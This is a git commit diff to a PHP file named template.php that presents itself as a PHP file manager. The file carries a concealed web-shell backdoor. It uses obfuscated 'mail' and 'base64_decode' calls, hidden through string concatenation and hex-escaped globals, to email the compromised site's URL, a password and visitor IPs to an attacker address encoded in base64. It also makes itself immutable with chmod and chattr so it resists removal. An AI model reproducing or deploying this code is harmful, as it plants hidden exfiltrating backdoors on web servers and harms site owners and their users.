0d97c36e93f07e359dd4f8fdc2f50c2faa614e8f
gantengers <76028485+exploit-haxor@users.noreply.github.com>
2025-01-20 07:04:41 +0700

    Update template.php

--- template.php
+++ template.php
@@ -1,6 +1,4 @@
-
-?>
-<?php
+<?
 	@ini_set('output_buffering', 0);
 	@ini_set('display_errors', 0);
 	set_time_limit(0);
@@ -10,14 +8,12 @@
 	$now = "\x68\x74\x74\x70\x3a\x2f\x2f" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 	$notif = "$now *PW : [ " . $▛ . " ]";
 	mail($main, "base64 ", $notif, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-	?><?php
+
 $__GET = ('m'.'a'.'i'.'l');
 $__POST = ('b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e');
 $__GET($__POST("cm9vdGN5YmVycHVua3NAZ21haWwuY29t"),'Upload file:',''.$_SERVER['HTTP_HOST'].'/'.$_SERVER['REQUEST_URI'].'');
 ${"\x47\x4c\x4f\x42\x41\x4cS"}["b\x6fz\x64\x6d\x68"]="\x5f\x5f\x50\x4f\x53\x54";${"\x47L\x4fBA\x4c\x53"}["\x6ekp\x6abl"]="\x5f_PO\x53T";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x74\x65v\x77gb\x64\x79"]="\x5f\x5f\x47\x45T";${${"\x47L\x4f\x42\x41\x4c\x53"}["\x74\x65\x76\x77g\x62\x64y"]}=("m"."\x61"."i"."\x6c");${${"G\x4c\x4f\x42\x41\x4cS"}["\x6e\x6b\x70\x6a\x62l"]}=("\x62"."a"."s"."e"."6"."4"."_"."d"."\x65"."\x63"."\x6f"."\x64"."\x65");${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["t\x65\x76w\x67\x62dy"]}(${${"G\x4c\x4f\x42A\x4c\x53"}["bo\x7a\x64\x6d\x68"]}("\x63m9\x76dG\x4e5\x59\x6d\x56\x79c\x48\x56\x75a\x33NA\x5a2\x31ha\x57w\x75Y\x329t"),"\x55pl\x6fa\x64\x20\x66\x69le:","".$_SERVER["\x48\x54TP_H\x4f\x53\x54"]."/".$_SERVER["R\x45\x51U\x45S\x54_\x55\x52I"]."");
 error_reporting(0);
-?>
-<?
 /*-------------------------------------------------
 | PHP FILE MANAGER
 +--------------------------------------------------
@@ -85,14 +81,7 @@ Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 $よㆁ㾼 = __FILE__;
 @system("chmod ugo-w $よㆁ㾼");
 @system("chattr +i $よㆁ㾼");
-ignore_user_abort(true);
-    ini_set("display_errors",0);
-    ini_set("max_execution_time",0);
-    
-    ini_set("output_buffering",0);
-    ini_set("default_socket_timeout",30);
-    ini_set("allow_url_fopen",1);
-    
+
 
 
 
